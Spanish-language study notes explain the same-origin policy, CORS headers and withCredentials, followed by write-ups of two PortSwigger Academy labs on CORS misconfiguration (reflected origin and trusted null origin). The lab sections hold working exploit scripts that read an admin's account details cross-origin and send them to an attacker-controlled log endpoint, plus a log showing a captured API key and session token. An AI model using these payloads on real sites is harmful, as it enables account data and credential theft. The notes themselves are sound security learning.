# SOP 

> La política del mismo origen impide que los scripts de un origen accedan a datos de otro origen. Un origen consta de un esquema de URI, un dominio y un número de puerto.

Al parecer fue primero que el CORS

## HttpOnly

Es una cabecera que tiene que ver con compartir los datos entre subdominios lo cual no lo permite.

# CORS

> Cross Origin (origen cruzado) es la palabra que se utiliza para denominar
el tipo de peticiones que se realizan a un dominio diferente del dominio de origen desde donde se realiza la petición. De esta forma, por una parte tenemos las peticiones de origen cruzado (cross-origin) y las peticiones del mismo origen (same-origin).

> Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain.

Osea que son peticiones que se generan desde nuestra pagina a otra pagina.

> CORS (Cross-Origin Resource Sharing) es un mecanismo o política de seguridad que permite controlar las peticiones HTTP asíncronas que se pueden realizar desde un navegador a un servidor con un dominio diferente de la página cargada originalmente. 
Este tipo de peticiones se llaman peticiones de origen cruzado (cross-origin).

Por defecto 

> Utilizando este tipo de peticiones asíncronas, los recursos situados en dominios diferentes al de la página actual no están permitidos por defecto.
Es lo que se suele denominar protección de CORS. Su finalidad es dificultar la posibilidad de añadir recursos ajenos en un sitio determinado.

## Access-Control-Allow-Origin

Esta es una cabecera que se puede añadir para pemitir solicitudes cruzadas hacia otros dominion y se usa asi:

```
Access-Control-Allow-Origin: https://domain.com/
Access-Control-Allow-Origin: *

```


> El asterisco * indica que se permiten peticiones de origen cruzado a cualquier dominio, algo que puede ser interesante cuando se tienen API públicas a las que quieres permitir el acceso al público en general, 
casos como los de Google Fonts o JSDelivr, por citar un ejemplo.

EJEMPLO:

Segun lo entendido el servidor robust-website.com hace una petcion a https://normal-website.com

```
GET /data HTTP/1.1
Host: robust-website.com
Origin : https://normal-website.com

```

***Conclucion***: El CORS se configura del lado del servidor y a las dos partes se le llama origen (Cliente y Servidor) osea si voy a hacer una peticion desde mipagina.com el origuen seria ese
a mi serverapi.com (pero este tambien tiene un campo origen cuando se manda la respuesta y el origen seria serverapi.com pero al enviar la respuesta) ahora al enviar esa peticion el servidor
revisa si este origen tiene permisos para pedir datos del servidor( para apis por ejemplo la poken api queremos que todos puedan solicitar datos entonces se usa el asterisco
en la Access-Control-Allow-Origin:*) si no los tiene pues regresa el error de CORS si si esta permitido ese "origen" pues regresa los datos.

## Access-Control-Allow-Credentials

> El encabezado Access-Control-Allow-Credentials funciona junto con la propiedad XMLHttpRequest.withCredentials o con la opción credentials en el constructor Request() de la API Fetch. Para una solicitud CORS con credenciales, para que los navegadores expongan la respuesta al código JavaScript de la interfaz, tanto el servidor (usando el encabezado Access-Control-Allow-Credentials ) como el cliente (configurando el modo de credenciales para XHR, Fetch o Solicitud Ajax) debe indicar que están optando por incluir credenciales.
Osea permiten que el cliente sepa que se pueden hacer peticiones cruzadas con credenciales.

## XMLHttpRequest.withCredentials

> La propiedad XMLHttpRequest.withCredentials es un valor booleano que indica si se deben realizar o no solicitudes de Access-Control sitios utilizando credenciales como cookies, encabezados de autorización o certificados de cliente TLS. La configuración con withCredentials no tiene ningún efecto en las solicitudes del mismo sitio.

> https://runebook.dev/es/docs/dom/xmlhttprequest/withcredentials

```
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null

```

# CORS vulnerability with basic origin reflection

Para este lab primero se verifica que la pagina es vulnerable poniendo un Origen aleatoreo por ejemplo Origin:www.evil.com esto se pone en la 
pagina donde se ve los detalles de la cuenta entonces con el repeater se renvia y lo que se nota es que 
ese mismo origen que inyectamos se ve reflekado en la respuesta junto con las respectivas cabeceras: 

```
Access-Control-Allow-Origin: www.evil.com
Access-Control-Allow-Credentials: true

```

Entonces el ataque consiste en lo siguiete: Crear un scritp que se aproveche de esta vulnerabilidad de aceptar cualquier origen, que un usuario admin oprima el 
link donde esta el script este lo que hace es generar una  peticion hacia account details de ahi saca los datos que es el token de la api para posteriormente
generar una peticion a un servidor del atacante en donde se manda los datos del admin.

```

<html>
<head>
<body>
<script>
	
 var xhr = new XMLHttpRequest(); // creamos un objeto para poder hacer peticiones
 var url = "https://0ac60051041133d6c0b462860014009b.web-security-academy.net/accountDetails"; // definimos la url donde regresa el token de un usuario

 xhr.onreadystatechange = function() { // esta funcion sirve para que cuando se genere el evento de DONE que es cuando la pagina ya termina de tardar
 if (xhr.readyState == XMLHttpRequest.DONE) {
 fetch("/log?key=" + xhr.responseText)// es una peticion al servidor del atacante con los datos que le intersa robar como es asincrono hasta que se genere no
// ejecuta este codigo
 	}
 }

 
 xhr.open('GET',url,true) // le que tipo de peticion se tiene que hacer  la url y true para decirle que se pueden hacer peticiones asincronas
 xhr.withCredentials = true;// Para que permita peticiones cruzadas con cookies y cledenciales
 xhr.send(null);// envio de la peticion inicial



</script>

</body>
</html>

```

Si revisamos el log del servidor del atacante tendriamos que ver algo asi:

```

10.0.42.54       2022-08-02 20:26:24 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22eSYXthMZ83TzlMynck1P2Yc4c2EyQ5Q0%22,%20%20%22sessions%22:%20[%20%20%20%20%22xhtZk7Xn0jtwvFjXRrcFbY3u2iO0OH9Y%22%20%20]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
19.21.168.1   2022-08-02 20:26:24 +0000 "GET / HTTP/1.1"

```


# CORS vulnerability with trusted null origin

Es parecido al laboratorio pasado solo que  ahora se pone el Origin: null y se ve reflejado en la respuesta
para generar un origen null se usa un iframe.

```
<html>
<head>
<body>
<iframe sandbox="allow-scripts" srcdoc="
<script>
 var xhr = new XMLHttpRequest();
 var url = 'https://0a29001d04361e32c11ae084002a00db.web-security-academy.net'

 xhr.onreadystatechange = function() {
 if (xhr.readyState == XMLHttpRequest.DONE) {
 fetch('https://exploit-0afc0054040a1e43c1cee0c801c60000.web-security-academy.net/log?key=' + xhr.responseText)
    }
 }


 xhr.open('GET',url + '/accountDetails',true);
 xhr.withCredentials = true;
 xhr.send(null);

</script>"></iframe>
</body>
</html>
	
```	
